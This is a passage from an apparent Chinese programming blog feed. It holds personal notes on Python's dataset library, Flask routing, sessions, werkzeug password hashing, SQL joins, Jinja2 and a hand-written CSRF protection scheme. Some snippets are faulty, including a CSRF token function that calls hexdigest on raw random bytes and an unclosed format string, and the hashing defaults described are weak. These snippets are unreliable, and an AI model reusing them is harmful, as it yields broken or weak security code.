class="line">cur.execute(&quot;insert into people values (?, ?)&quot;, (who, age))</div><div class="line"> </div><div class="line"># And this is the named style:</div><div class="line">cur.execute(&quot;select * from people where name_last=:who and age=:age&quot;, &#123;&quot;who&quot;: who, &quot;age&quot;: age&#125;)</div><div class="line"> </div><div class="line">print cur.fetchone()</div></pre></td></tr></table></figure>
<p>参考文章：<br><a href="http://xlixli.net/?p=377" target="_blank" rel="external">http://xlixli.net/?p=377</a><br><a href="http://www.cnblogs.com/sevck/p/6733702.html" target="_blank" rel="external">http://www.cnblogs.com/sevck/p/6733702.html</a><br><a href="https://crazyof.me/blog/archives/2224.html" target="_blank" rel="external">https://crazyof.me/blog/archives/2224.html</a></p>
]]></content>
      
        
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> Python </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> 安全开发 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Python开发笔记]]></title>
      <url>/2017/10/17/Python%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<p>近期学习开发中遇到的一些知识，做的学习笔记，做个小记录，持续更新中…<br><a id="more"></a></p>
<h1 id="Dataset基于SQLAlchemy的便利工具"><a href="#Dataset基于SQLAlchemy的便利工具" class="headerlink" title="Dataset基于SQLAlchemy的便利工具"></a>Dataset基于SQLAlchemy的便利工具</h1><p><a href="https://dataset.readthedocs.io/en/latest/index.html" target="_blank" rel="external">官方文档</a></p>
<p>数据集使得数据库中的数据读取和写入数据就像阅读和编写JSON文件一样简单。</p>
<p>dataset对于操作JSON、CSV文件、NoSQL非常好用。</p>
<p><code>import dataset</code></p>
<p>连接MySQL数据库：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">db = dataset.connect(&apos;mysql://username:password@10.10.10.10/ctf?charset=utf8&apos;)</div><div class="line">用户名:username，密码:password，数据库地址(地址+端口):10.10.10.10，database名: ctf</div><div class="line">连接SQLite数据库：</div><div class="line">db = dataset.connect(&apos;sqlite:///ctf.db&apos;)</div><div class="line">连接PostgreSQL数据库：</div><div class="line">db = dataset.connect(&apos;postgresql://scott:tiger@localhost:5432/mydatabase&apos;)</div></pre></td></tr></table></figure>
<p>一定要注意指定字符编码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">table = db[&apos;city&apos;]  #（选择city表）</div><div class="line">user = table(&apos;name&apos;) # 找出表中&apos;name&apos;列属性所有数据</div><div class="line">res = db.query(&apos;select name from table limit 10&apos;) # 如果不需要查看全部数据的话最好用limit，因为全部数据的载入非常非常耗时间</div><div class="line">for x in res:</div><div class="line">    print x[&apos;name&apos;] # 选name字段的数据</div><div class="line">table.insert(dict(name=&apos;John Doe&apos;, age=37))</div><div class="line">table.insert(dict(name=&apos;Jane Doe&apos;, age=34, gender=&apos;female&apos;))</div><div class="line">john = table.find_one(name=&apos;John Doe&apos;)</div></pre></td></tr></table></figure>
<p>在数据库中查找是否有同时满足多个条件的数据：<code>table.find_one(属性1=属性值1, 属性2=属性值2, ...)</code></p>
<p>注：<code>find_one</code>速度很慢</p>
<h2 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h2><p>dataset会根据输入自动创建表和字段名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">table = db[&apos;user&apos;]</div><div class="line"># 或者table = db.get_table(&apos;user&apos;)</div><div class="line">table.insert(dict(name=&apos;John Doe&apos;, age=46, country=&apos;China&apos;))</div><div class="line">table.insert(dict(name=&apos;Jane Doe&apos;, age=37, country=&apos;France&apos;, gender=&apos;female&apos;))</div><div class="line"># 主键id自动生成</div></pre></td></tr></table></figure>
<h2 id="更新数据"><a href="#更新数据" class="headerlink" title="更新数据"></a>更新数据</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">table.update(dict(name=&apos;John Doe&apos;, age=47), [&apos;name&apos;])</div><div class="line"># 第二个参数相当于sql update语句中的where，用来过滤出需要更新的记录</div></pre></td></tr></table></figure>
<h2 id="事务操作"><a href="#事务操作" class="headerlink" title="事务操作"></a>事务操作</h2><p>事务操作可以简单的使用上下文管理器来实现,出现异常，将会回滚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">with dataset.connect() as tx:</div><div class="line">    tx[&apos;user&apos;].insert(dict(name=&apos;John Doe&apos;, age=46, country=&apos;China&apos;))</div><div class="line"># 相当于：</div><div class="line">db = dataset.connect()</div><div class="line">db.begin()</div><div class="line">try:</div><div class="line">    db[&apos;user&apos;].insert(dict(name=&apos;John Doe&apos;, age=46, country=&apos;China&apos;))</div><div class="line">    db.commit()</div><div class="line">except:</div><div class="line">    db.rollback()</div><div class="line"># 也可以嵌套使用:</div><div class="line">db = dataset.connect()</div><div class="line">with db as tx1:</div><div class="line">    tx1[&apos;user&apos;].insert(dict(name=&apos;John Doe&apos;, age=46, country=&apos;China&apos;))</div><div class="line">    with db as tx2:</div><div class="line">        tx2[&apos;user&apos;].insert(dict(name=&apos;Jane Doe&apos;, age=37, country=&apos;France&apos;, gender=&apos;female&apos;))</div></pre></td></tr></table></figure>
<h2 id="从表获取数据"><a href="#从表获取数据" class="headerlink" title="从表获取数据"></a>从表获取数据</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">users = db[&apos;user&apos;].all()</div><div class="line">for user in db[&apos;user&apos;]:</div><div class="line">    # print(user[&apos;age&apos;])</div><div class="line">    # chinese_users = user.find(country=&apos;China&apos;)</div><div class="line">    john = user.find_one(name=&apos;John Doe&apos;)</div></pre></td></tr></table></figure>
<p>获取非重复数据</p>
<p><code>db[&#39;user&#39;].distinct(&#39;country&#39;)</code></p>
<h2 id="删除记录"><a href="#删除记录" class="headerlink" title="删除记录"></a>删除记录</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">table.delete(place=&apos;Berlin&apos;)</div></pre></td></tr></table></figure>
<h2 id="执行SQL语句"><a href="#执行SQL语句" class="headerlink" title="执行SQL语句"></a>执行SQL语句</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">result = db.query(&apos;SELECT country, COUNT(*) c FROM user GROUP BY country&apos;)</div><div class="line">for row in result:</div><div class="line">    print(row[&apos;country&apos;], row[&apos;c&apos;])</div></pre></td></tr></table></figure>
<h2 id="导出数据"><a href="#导出数据" class="headerlink" title="导出数据"></a>导出数据</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">result = db[&apos;users&apos;].all()</div><div class="line">dataset.freeze(result, format=&apos;json&apos;, filename=&apos;users.json&apos;)</div></pre></td></tr></table></figure>
<h1 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h1><p>JSON(JavaScript Object Notation) 是一种轻量级的数据交换格式，非常易于人阅读和编写。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">import json</div><div class="line">json.dumps 将 Python 对象编码成 JSON 字符串</div><div class="line">json.loads 将已编码的 JSON 字符串解码为 Python 对象</div></pre></td></tr></table></figure>
<h1 id="MySQL数据库："><a href="#MySQL数据库：" class="headerlink" title="MySQL数据库："></a>MySQL数据库：</h1><p>分类表-categories，包括类别web,reversing，crypto(加解密),mic等</p>
<p>题目表-tasks,包括题目id，题目名，flag,分值，文件&amp;地址，题目等级，题目详细描述</p>
<p>flag表-flag,包括题目id,用户id,得分，时间戳</p>
<p>用户表-users，包括用户id,用户名，密码</p>
<p>题目分类表-<code>cat_task</code>,包括题目id,题目类别id</p>
<p>flag表中每条数据由于是有题目ID <code>task_id</code>和用户ID <code>user_id</code>来共同确认的，所以采用复合主键：<code>primary key (task_id,user_id)</code></p>
<p><a href="http://blog.csdn.net/u011781521/article/details/71083112" target="_blank" rel="external">联合主键和复合主键的区别</a></p>
<h1 id="python装饰器"><a href="#python装饰器" class="headerlink" title="python装饰器"></a>python装饰器</h1><p>Decorator通过返回包装对象实现间接调用,以此插入额外逻辑</p>
<p><a href="https://www.zhihu.com/question/26930016" target="_blank" rel="external">https://www.zhihu.com/question/26930016</a></p>
<p>wraps本身也是一个装饰器，它能把原函数的元信息拷贝到装饰器函数中，这使得装饰器函数也有和原函数一样的元信息了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">from functools import wraps</div><div class="line">def logged(func):</div><div class="line">    @wraps(func)</div><div class="line">    def with_logging(*args,**kwargs):</div><div class="line">        print func.__name__ + &quot;was called&quot;</div><div class="line">        return func(*args,**kwargs)</div><div class="line">    return with_logging</div><div class="line"></div><div class="line">@logged</div><div class="line">def f(x):</div><div class="line">    &quot;&quot;&quot;does some math&quot;&quot;&quot;</div><div class="line">    return x + x * x</div><div class="line"></div><div class="line">print f.__name__ # prints &apos;f&apos;</div><div class="line">print f.__doc__  # prints &apos;does some math&apos;</div></pre></td></tr></table></figure>
<h1 id="web框架采用flask"><a href="#web框架采用flask" class="headerlink" title="web框架采用flask"></a>web框架采用flask</h1><p><code>from flask import Flask</code></p>
<p>引入Flask类，Flask类实现了一个<code>WSGI(Web Server Gateway Interface)</code>应用</p>
<p><code>app = Flask(__name__)</code></p>
<p>app是Flask的实例，它接收包或者模块的名字作为参数，但一般都是传递<code>__name__</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">@app.route(&apos;/&apos;)</div><div class="line">def hello_world():</div><div class="line">    return &apos;Hello World!&apos;</div></pre></td></tr></table></figure>
<p>使用<code>app.route</code>装饰器会将URL和执行的视图函数的关系保存到<code>app.url_map</code>属性上。处理URL和视图函数的关系的程序就是路由，这里的视图函数就是<code>hello_world</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    app.run(host=&apos;0.0.0.0&apos;,port=9000)</div></pre></td></tr></table></figure>
<p>使用这个判断可以保证当其他文件引用这个文件的时候（例如<code>from hello import app</code>）不会执行这个判断内的代码，也就是不会执行<code>app.run</code>函数。</p>
<p>执行<code>app.run</code>就可以启动服务了。默认Flask只监听虚拟机的本地<code>127.0.0.1</code>这个地址，端口为<code>5000</code>。而我们对虚拟机做的端口转发端口是<code>9000</code>，所以需要制定host和port参数，<code>0.0.0.0</code>表示监听所有地址，这样就可以在本机访问了。</p>
<p>服务器启动后，会调用<code>werkzeug.serving.run_simple</code>进入轮询，默认使用单进程单线程的<code>werkzeug.serving.BaseWSGIServer</code>处理请求，实际上还是使用标准库<code>BaseHTTPServer.HTTPServer</code>，通过<code>select.select</code>做0.5秒的<code>while TRUE</code>的事件轮询。当我们访问<code>http://127.0.0.1:9000/</code>,通过<code>app.url_map</code>找到注册的<code>/</code>这个URL模式,就找到了对应的<code>hello_world</code>函数执行，返回<code>hello world!</code>,状态码为200。如果访问一个不存在的路径，如访问<code>http://127.0.0.1:9000/a</code>,Flask找不到对应的模式，就会向浏览器返回<code>Not Found</code>，状态码为404</p>
<h1 id="flask中jsonify的作用"><a href="#flask中jsonify的作用" class="headerlink" title="flask中jsonify的作用"></a>flask中jsonify的作用</h1><p>jsonify的作用实际上就是将我们传入的json形式数据序列化成为json字符串，作为响应的body，并且设置响应的<code>Content-Type</code>为<code>application/json</code>，构造出响应返回至客户端</p>
<p>效果等于<code>json.dumps</code></p>
<p><code>jsonify</code>的<code>Content-Type</code>字段值为<code>application/json</code></p>
<p><code>json.dumps</code>的<code>Content-Type</code>字段值为<code>text/html</code></p>
<h1 id="修改flask中静态文件夹"><a href="#修改flask中静态文件夹" class="headerlink" title="修改flask中静态文件夹"></a>修改flask中静态文件夹</h1><p>修改的flask默认的static文件夹只需要在创建Flask实例的时候,把<code>static_folder</code>和<code>static_url_path</code>参数设置为空字符串即可。</p>
<p><code>app = Flask(__name__, static_folder=&#39;&#39;, static_url_path=&#39;&#39;)</code></p>
<p>访问的时候用<code>url_for</code>函数，res文件夹和static文件夹同一级：</p>
<p><code>url_for(&#39;static&#39;, filename=&#39;res/favicon.ico&#39;)</code></p>
<h1 id="werkzeug"><a href="#werkzeug" class="headerlink" title="werkzeug"></a>werkzeug</h1><p>werkzeug是一个WSGI工具包，可以作为一个Web框架的底层库。它封装好了很多Web框架的东西，例如 Request，Response等等。Flask框架就是一Werkzeug 为基础开发的</p>
<h2 id="generate-password-hash-password"><a href="#generate-password-hash-password" class="headerlink" title="generate_password_hash(password)"></a>generate_password_hash(password)</h2><p>将用户输入的明文密码加密成密文进行存储</p>
<p>密码加盐哈希函数。用来将明文密码加密，返回加密后的密文，用来进行用户注册</p>
<p>函数定义：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">werkzeug.security.generate_password_hash(password, method=&apos;pbkdf2:sha1&apos;, salt_length=8)</div><div class="line">密文格式：method$salt$hash</div><div class="line">password: 明文密码</div><div class="line">method: 哈希的方式（需要是hashlib库支持的），格式为</div><div class="line">pbpdf2:&lt;method&gt;[:iterations]。参数说明：</div><div class="line">    method：哈希的方式，一般为SHA1，</div><div class="line">    iterations：（可选参数）迭代次数，默认为1000。</div><div class="line">slat_length: 盐值的长度，默认为8</div></pre></td></tr></table></figure>
<h2 id="check-password-hash-hash-password"><a href="#check-password-hash-hash-password" class="headerlink" title="check_password_hash(hash,password)"></a>check_password_hash(hash,password)</h2><p>验证经过<code>generate_password_hash</code>哈希的密码，将明文和密文进行比较,查看是否一致，用来验证用户登录</p>
<p>函数定义：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">werkzeug.security.check_password_hash(pwhash, password)</div><div class="line">pwhash: generate_password_hash生成的哈希字符串</div><div class="line">password: 需要验证的明文密码</div></pre></td></tr></table></figure>
<h1 id="flask中的session"><a href="#flask中的session" class="headerlink" title="flask中的session"></a>flask中的session</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">from flask import session</div><div class="line">user = db[&apos;users&apos;].find_one(username=username)</div><div class="line">session[&apos;user_id&apos;] = user[&apos;id&apos;]</div></pre></td></tr></table></figure>
<p>由于使用了session，所以需要设置一个<code>secret_key</code>用来做一些模块的hash<br>Flask Web Development 中的内容:</p>
<p><code>SECRET_KEY</code>配置变量是通用密钥,可在Flask和多个第三方扩展中使用。如其名所示,加密的强度取决于变量值的机密度。不同的程序要使用不同的密钥,而且要保证其他人不知道你所用的字符串。</p>
<p><code>SECRET_KEY</code>的作用主要是提供一个值做各种HASH, 是在其加密过程中作为算法的一个参数(salt或其他)。所以这个值的复杂度也就影响到了数据传输和存储时的复杂度。</p>
<h1 id="flask-变量规则"><a href="#flask-变量规则" class="headerlink" title="flask 变量规则"></a>flask 变量规则</h1><p>要给URL添加变量部分，你可以把这些特殊的字段标记为<code>&lt;variable_name&gt;</code>， 这个部分将会作为命名参数传递到你的函数。规则可以用<code>&lt;converter:variable_name&gt;</code>指定一个可选的转换器</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">@route(&apos;/hello/&lt;name&gt;&apos;)</div><div class="line">def index(name):</div><div class="line">  return &apos;&lt;b&gt;Hello &#123;&#123;name&#125;&#125;&lt;/b&gt;!&apos;</div></pre></td></tr></table></figure>
<h1 id="数据库查询"><a href="#数据库查询" class="headerlink" title="数据库查询"></a>数据库查询</h1><p>对dataset的数据查询，使用冒号来为变量传参。</p>
<p><code>select f.task_id from flags f where f.user_id = :user_id&#39;&#39;&#39;,user_id=session[&#39;user_id&#39;])</code></p>
<h1 id="模板渲染"><a href="#模板渲染" class="headerlink" title="模板渲染"></a>模板渲染</h1><p>使用<code>render_template</code>方法来渲染模板。将模板名和你想作为关键字的参数传入模板的变量</p>
<h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><p><code>IFNULL(expr1,expr2)</code></p>
<p>如果expr1不是NULL，<code>IFNULL()</code>返回expr1，否则它返回expr2。</p>
<p><code>IFNULL()</code>返回一个数字或字符串值，取决于它被使用的上下文环境。</p>
<p>max函数是用来找出记录集中最大值的记录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1. 对于left join，不管on后面跟什么条件，左表的数据全部查出来，因此要想过滤需把条件放到where后面</div><div class="line">2. 对于inner join，满足on后面的条件表的数据才能查出，可以起到过滤作用。也可以把条件放到where后面</div></pre></td></tr></table></figure>
<p>在使用left jion时，on和where条件的区别如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1、 on条件是在生成临时表时使用的条件，它不管on中的条件是否为真，都会返回左边表中的记录。</div><div class="line">2、where条件是在临时表生成好后，再对临时表进行过滤的条件。这时已经没有left join的含义（必须返回左边表的记录）了，条件不为真的就全部过滤掉。</div></pre></td></tr></table></figure>
<p>order by的用法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">使用order by，一般是用来，依照查询结果的某一列（或多列）属性，进行排序（升序：ASC；降序：DESC；默认为升序）。</div><div class="line">当排序列含空值时：</div><div class="line">ASC：排序列为空值的元组最后显示。</div><div class="line">DESC：排序列为空值的元组最先显示。</div><div class="line">可以把null值看做无穷大</div><div class="line">select * from s order by sno desc,  sage asc</div></pre></td></tr></table></figure>
<p>group by的用法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">group by按照查询结果集中的某一列（或多列），进行分组，值相等的为一组</div><div class="line">1、细化集函数（count，sum，avg，max，min）的作用对象：</div><div class="line">未对查询结果分组，集函数将作用于整个查询结果。</div><div class="line">对查询结果分组后，集函数将分别作用于每个组。</div><div class="line">SELECT cno,count(sno) from sc group by cno</div><div class="line">2、GROUP BY子句的作用对象是查询的中间结果表</div><div class="line">分组方法：按指定的一列或多列值分组，值相等的为一组。</div><div class="line">使用GROUP BY子句后，SELECT子句的列名列表中只能出现分组属性（比如：sno）和集函数（比如：count（））</div><div class="line">select sno,count(cno) from sc group by sno</div><div class="line">3、多个列属性进行分组</div><div class="line">select cno,grade,count(cno) from sc group by cno,grade</div><div class="line">4、使用HAVING短语筛选最终输出结果</div><div class="line">只有满足HAVING短语指定条件的组才输出。</div><div class="line">HAVING短语与WHERE子句的区别：作用对象不同。</div><div class="line">1、WHERE子句作用于基表或视图，从中选择满足条件的元组。</div><div class="line">2、HAVING短语作用于组，从中选择满足条件的组</div><div class="line">select sno from sc group by sno having count(cno)&gt;3</div><div class="line">select sno,count(cno) from sc where grade&gt;60 group by sno having count(cno)&gt;3</div></pre></td></tr></table></figure>
<h1 id="MySQL的左连接、右连接、等值连接"><a href="#MySQL的左连接、右连接、等值连接" class="headerlink" title="MySQL的左连接、右连接、等值连接"></a>MySQL的左连接、右连接、等值连接</h1><h2 id="1-左连接（left-join-）"><a href="#1-左连接（left-join-）" class="headerlink" title="1.左连接（left join ）"></a>1.左连接（left join ）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">select m.columnname……,n.* columnname…..</div><div class="line">from left_table m left join right_table n on m.columnname_join=n.columnname_join and n.columnname=xxx</div><div class="line">where m.columnname=xxx…..</div></pre></td></tr></table></figure>
<p>ON是连接条件，用于把2表中等值的记录连接在一起，但是不影响记录集的数量。若是表<code>left_table</code>中的某记录，无法在表<code>right_table</code>找到对应的记录，则此记录依然显示在记录集中，只是表<code>right_table</code>需要在查询显示的列的值用NULL替代；</p>
<p>ON连接条件中表<code>n.columnname=xxx</code>用于控制<code>right_table</code>表是否有符合要求的列值还是用NULL替换的方式显示在查询列中，不影响记录集的数量；</p>
<p>WHERE字句控制记录是否符合查询要求，不符合则过滤掉</p>
<h2 id="2-右连接（right-join）"><a href="#2-右连接（right-join）" class="headerlink" title="2.右连接（right join）"></a>2.右连接（right join）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">select m.columnname……,n.* columnname…..</div><div class="line">from left_table m right join right_table n on m. columnname_join=n. columnname_join and m. columnname=xxx</div><div class="line">where n.columnname=xxx…..</div></pre></td></tr></table></figure>
<h2 id="3-等值连接"><a href="#3-等值连接" class="headerlink" title="3.等值连接"></a>3.等值连接</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">select m.columnname……,n.* columnname…..</div><div class="line">from left_table m [inner] join right_table n on m. columnname_join=n. columnname_join</div><div class="line">where m.columnname=xxx….. and n.columnname=xxx….</div><div class="line">或者</div><div class="line">select m.columnname……,n.* columnname…..</div><div class="line">from left_table m  , right_table n</div><div class="line">where m. columnname_join=n. columnname_join and</div><div class="line">m.columnname=xxx….. and n.columnname=xxx….</div></pre></td></tr></table></figure>
<p>ON是连接条件，不再与左连接或右连接的功效一样，除了作为2表记录匹配的条件外，还会起到过滤记录的作用，若<code>left_table</code>中记录无法在<code>right_table</code>中找到对应的记录，则会被过滤掉；</p>
<p>WHERE字句，不管是涉及表<code>left_table</code>、表<code>right_table</code>上的限制条件，还是涉及2表连接的条件，都会对记录集起到过滤作用，把不符合要求的记录刷选掉；</p>
<h1 id="jinja2获取循环索引"><a href="#jinja2获取循环索引" class="headerlink" title="jinja2获取循环索引"></a>jinja2获取循环索引</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">jinja2获取循环&#123;% for i in n %&#125;的索引使用loop.index</div><div class="line">&#123;% for i in names %&#125;</div><div class="line">&lt;tr&gt;</div><div class="line">    &lt;td&gt;&#123;&#123; loop.index &#125;&#125;&lt;/td&gt;  //当前是第x条</div><div class="line">    &lt;td&gt;&#123;&#123; i.name &#125;&#125;&lt;/td&gt;</div><div class="line">&lt;/tr&gt;</div><div class="line">&#123;% endfor %&#125;</div></pre></td></tr></table></figure>
<h1 id="flask-重定向和错误"><a href="#flask-重定向和错误" class="headerlink" title="flask 重定向和错误"></a>flask 重定向和错误</h1><p>可以用<code>redirect()</code>函数把用户重定向到其它地方。放弃请求并返回错误代码，用<code>abort()</code>函数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">from flask import abort, redirect, url_for</div><div class="line">@app.route(&apos;/&apos;)</div><div class="line">def index():</div><div class="line">    return redirect(url_for(&apos;login&apos;))</div><div class="line">@app.route(&apos;/login&apos;)</div><div class="line">def login():</div><div class="line">    abort(401)</div><div class="line">    this_is_never_executed()</div></pre></td></tr></table></figure>
<p>默认情况下，错误代码会显示一个黑白的错误页面。如果你要定制错误页面，可以使用<code>errorhandler()</code></p>
<p>装饰器:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">from flask import render_template</div><div class="line">@app.errorhandler(404)</div><div class="line">def page_not_found(error):</div><div class="line">    return render_template(&apos;page_not_found.html&apos;), 404</div></pre></td></tr></table></figure>
<p>注意 <code>render_template()</code>调用之后的 404 。这告诉Flask，该页的错误代码是404 ，即没有找到。默认为200，也就是一切正常。</p>
<h1 id="flask-CSRF防护机制"><a href="#flask-CSRF防护机制" class="headerlink" title="flask CSRF防护机制"></a>flask CSRF防护机制</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">@app.before_request</div><div class="line">def csrf_protect():</div><div class="line">    if request.method == &quot;POST&quot;:</div><div class="line">        token = session.pop(&apos;_csrf_token&apos;, None)</div><div class="line">        if not token or token != request.form.get(&apos;_csrf_token&apos;):</div><div class="line">            abort(403)</div><div class="line">def some_random_string():</div><div class="line">    return  hashlib.sha256(os.urandom(16).hexdigest())</div><div class="line">def generate_csrf_token():</div><div class="line">    if &apos;_csrf_token&apos; not in session:</div><div class="line">        session[&apos;_csrf_token&apos;] = some_random_string()</div><div class="line">    return session[&apos;_csrf_token&apos;]</div></pre></td></tr></table></figure>
<p>在flask的全局变量里面注冊 上面那个生成随机token的函数</p>
<p><code>app.jinja_env.globals[&#39;csrf_token&#39;] = generate_csrf_token</code></p>
<p>在网页的模板是这么引入的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;form method=post action=&quot;&quot;&gt;    </div><div class="line">&lt;input name=_csrf_token type=hidden value=&quot;&#123;&#123; csrf_token() &#125;&#125;&quot;&gt;</div></pre></td></tr></table></figure>
<h1 id="flask上下文处理器"><a href="#flask上下文处理器" class="headerlink" title="flask上下文处理器"></a>flask上下文处理器</h1><p>Flask 上下文处理器自动向模板的上下文中插入新变量。上下文处理器在模板渲染之前运行，并且可以在模板上下文中插入新值。上下文处理器是一个返回字典的函数，这个字典的键值最终将传入应用中所有模板的上下文:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">@app.context_processor</div><div class="line">def inject_user():</div><div class="line">    return dict(user=g.user)</div></pre></td></tr></table></figure>
<p>上面的上下文处理器使得模板可以使用一个名为user值为<code>g.user</code>的变量。不过这个例子不是很有意思，因为g在模板中本来就是可用的，但它解释了上下文处理器是如何工作的。<br>变量不仅限于值，上下文处理器也可以使某个函数在模板中可用（由于Python允许传递函数）:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">@app.context_processor</div><div class="line">def utility_processor():</div><div class="line">    def format_price(amount, currency=u&apos;€&apos;):</div><div class="line">        return u&apos;&#123;0:.2f&#125;&#123;1&#125;.format(amount, currency)</div><div class="line">    return dict(format_price=format_price)</div><div class="line">上面的上下文处理器使得format_price函数在所有模板中可用:</div><div class="line">&#123;&#123; format_price(0.33) &#125;&#125;</div></pre></td></tr></table></figure>
<h1 id="日志记录"><a href="#日志记录" class="headerlink" title="日志记录"></a>日志记录</h1><p><code>handler = logging.FileHandler(&#39;flask.log&#39;, encoding=&#39;UTF-8&#39;)</code></p>
<h2 id="1、请求之前设置requestId并记录日志"><a href="#1、请求之前设置requestId并记录日志" class="headerlink" title="1、请求之前设置requestId并记录日志"></a>1、请求之前设置requestId并记录日志</h2><p>每个URL请求之前，定义requestId并绑定到g</p>
